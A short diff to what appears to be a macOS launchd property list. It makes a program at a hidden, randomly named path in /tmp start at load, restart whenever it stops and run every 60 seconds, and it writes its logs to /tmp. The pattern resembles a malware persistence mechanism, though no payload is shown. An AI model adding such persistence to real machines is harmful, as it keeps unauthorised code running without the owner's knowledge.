@@ -8,6 +8,14 @@
     <array>
       <string>/tmp/.tHhCc/update</string>
     </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/tmp/logfileout.log</string>
+    <key>StandardErrorPath</key>
+    <string>/tmp/logfilein.log</string>
     <key>StartInterval</key>
     <integer>60</integer>
   </dict>
